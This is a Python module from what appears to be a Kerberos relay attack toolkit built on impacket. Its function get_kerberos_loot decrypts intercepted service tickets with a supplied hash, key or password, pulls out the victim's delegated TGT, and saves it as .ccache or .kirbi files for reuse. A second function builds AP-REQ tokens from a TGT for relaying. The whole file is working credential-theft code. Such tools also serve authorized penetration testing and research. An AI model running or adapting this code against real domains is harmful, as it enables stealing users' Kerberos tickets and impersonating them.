# -*- coding: utf-8 -*-
"""Kerberos ticket export / AP-REQ building via impacket (optional dependency)."""

import random
import struct
from binascii import hexlify, unhexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.error import PyAsn1Error
from Cryptodome.Hash import MD4

from impacket import LOG
from impacket.krb5 import constants
from impacket.krb5.asn1 import AP_REQ, Authenticator, EncKrbCredPart, EncTicketPart, KRB_CRED, TGS_REP
from impacket.krb5.crypto import Key, _enctype_table, string_to_key, InvalidChecksum
from impacket.krb5.gssapi import GSS_C_DELEG_FLAG
from impacket.krb5.kerberosv5 import getKerberosTGS
from impacket.krb5.types import Principal
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech

from lib.protocols.kerberos.krb_relay.utils.krbcredccache import KrbCredCCache
from lib.protocols.kerberos.krb_relay.utils.spnego import GSSAPIHeader_KRB5_AP_REQ, GSSAPIHeader_SPNEGO_Init


def get_kerberos_loot(token, options):
    blob = decoder.decode(token, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
    data = blob["innerContextToken"]["negTokenInit"]["mechToken"]
    try:
        payload = decoder.decode(data, asn1Spec=GSSAPIHeader_KRB5_AP_REQ())[0]
    except PyAsn1Error as exc:
        raise Exception("Error obtaining Kerberos data") from exc

    decoded_tgs = payload["apReq"]
    cipher_text = decoded_tgs["ticket"]["enc-part"]["cipher"]
    new_cipher = _enctype_table[int(decoded_tgs["ticket"]["enc-part"]["etype"])]

    nthash = options.hashes.split(":")[1] if options.hashes else ""
    aes_key = options.aeskey or ""
    all_ciphers = [
        int(constants.EncryptionTypes.rc4_hmac.value),
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
    ]
    keys = {}
    if nthash:
        keys[int(constants.EncryptionTypes.rc4_hmac.value)] = unhexlify(nthash)
    if aes_key:
        if len(aes_key) == 64:
            keys[int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)] = unhexlify(aes_key)
        else:
            keys[int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value)] = unhexlify(aes_key)

    ekeys = {kt: Key(kt, key) for kt, key in keys.items()}
    if options.password and options.salt:
        for cipher in all_ciphers:
            if cipher == 23 and options.israwpassword:
                md4 = MD4.new()
                md4.update(options.password)
                ekeys[cipher] = Key(cipher, md4.digest())
            else:
                rawsecret = (
                    options.password.decode("utf-16-le", "replace").encode("utf-8", "replace")
                    if options.israwpassword
                    else options.password
                )
                ekeys[cipher] = string_to_key(cipher, rawsecret, options.salt)

    try:
        key = ekeys[decoded_tgs["ticket"]["enc-part"]["etype"]]
    except KeyError:
        LOG.error(
            "Could not find the correct encryption key for etype %s",
            decoded_tgs["ticket"]["enc-part"]["etype"],
        )
        return None

    try:
        plain_text = new_cipher.decrypt(key, 2, cipher_text)
    except InvalidChecksum:
        LOG.error("Ciphertext integrity failed; account password or AES key is incorrect")
        return None

    enc_ticket_part = decoder.decode(plain_text, asn1Spec=EncTicketPart())[0]
    session_key = Key(enc_ticket_part["key"]["keytype"], bytes(enc_ticket_part["key"]["keyvalue"]))
    cipher_text = decoded_tgs["authenticator"]["cipher"]
    new_cipher = _enctype_table[int(decoded_tgs["authenticator"]["etype"])]
    plain_text = new_cipher.decrypt(session_key, 11, cipher_text)
    authenticator = decoder.decode(plain_text, asn1Spec=Authenticator())[0]
    cksum = authenticator["cksum"]
    if cksum["cksumtype"] != 32771:
        raise Exception("Checksum is not KRB5 type: %d" % cksum["cksumtype"])

    flags = struct.unpack("<L", bytes(cksum["checksum"])[20:24])[0]
    if not flags & GSS_C_DELEG_FLAG:
        LOG.error("Delegate info not set, cannot extract ticket")
        return None

    dlen = struct.unpack_from("<H", bytes(cksum["checksum"])[26:28])[0]
    deldata = bytes(cksum["checksum"])[28 : 28 + dlen]
    creds = decoder.decode(deldata, asn1Spec=KRB_CRED())[0]
    plain_text = new_cipher.decrypt(session_key, 14, bytes(creds["enc-part"]["cipher"]))
    enc_part = decoder.decode(plain_text, asn1Spec=EncKrbCredPart())[0]

    for i, tinfo in enumerate(enc_part["ticket-info"]):
        username = "/".join([str(item) for item in tinfo["pname"]["name-string"]])
        realm = str(tinfo["prealm"])
        sname = Principal([str(item) for item in tinfo["sname"]["name-string"]])
        ticket = creds["tickets"][i]
        filename = "%s_%s" % (f"{username}@{realm}", sname)
        ccache = KrbCredCCache()
        ccache.fromKrbCredTicket(ticket, tinfo)
        if options.format == "ccache":
            ccache.saveFile(filename + ".ccache")
        else:
            oc = KRB_CRED()
            oc["tickets"].append(ticket)
            oc["enc-part"]["etype"] = 0
            new_enc_part = EncKrbCredPart()
            new_enc_part["ticket-info"].append(tinfo)
            oc["enc-part"]["cipher"] = encoder.encode(new_enc_part)
            with open(filename + ".kirbi", "wb") as outfile:
                outfile.write(encoder.encode(oc))
        return {
            "username": username,
            "domain": realm,
            "tgt": ccache.credentials[0].toTGT(),
        }
    return None


def build_apreq(domain, kdc, tgt, username, serviceclass, hostname, tgs=None):
    import datetime

    from impacket.krb5.asn1 import seq_set
    from impacket.krb5.types import KerberosTime, Ticket
    from pyasn1.type.univ import noValue

    username_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    servername = Principal(
        "%s/%s" % (serviceclass, hostname),
        type=constants.PrincipalNameType.NT_SRV_INST.value,
    )
    if tgs:
        tgs, cipher, _, sessionkey = tgs
    else:
        tgs, cipher, _, sessionkey = getKerberosTGS(
            servername,
            domain,
            kdc,
            tgt["KDC_REP"],
            tgt["cipher"],
            tgt["sessionKey"],
        )

    blob = SPNEGO_NegTokenInit()
    blob["MechTypes"] = [TypesMech["MS KRB5 - Microsoft Kerberos 5"]]
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs["ticket"])

    ap_req = AP_REQ()
    ap_req["pvno"] = 5
    ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    ap_req["ap-options"] = constants.encodeFlags([])
    seq_set(ap_req, "ticket", ticket.to_asn1)

    authenticator = Authenticator()
    authenticator["authenticator-vno"] = 5
    authenticator["crealm"] = domain
    seq_set(authenticator, "cname", username_principal.components_to_asn1)
    now = datetime.datetime.utcnow()
    authenticator["cusec"] = now.microsecond
    authenticator["ctime"] = KerberosTime.to_asn1(now)
    encoded_authenticator = encoder.encode(authenticator)
    encrypted_encoded_authenticator = cipher.encrypt(sessionkey, 11, encoded_authenticator, None)
    ap_req["authenticator"] = noValue
    ap_req["authenticator"]["etype"] = cipher.enctype
    ap_req["authenticator"]["cipher"] = encrypted_encoded_authenticator
    blob["MechToken"] = encoder.encode(ap_req)
    return blob.getData()
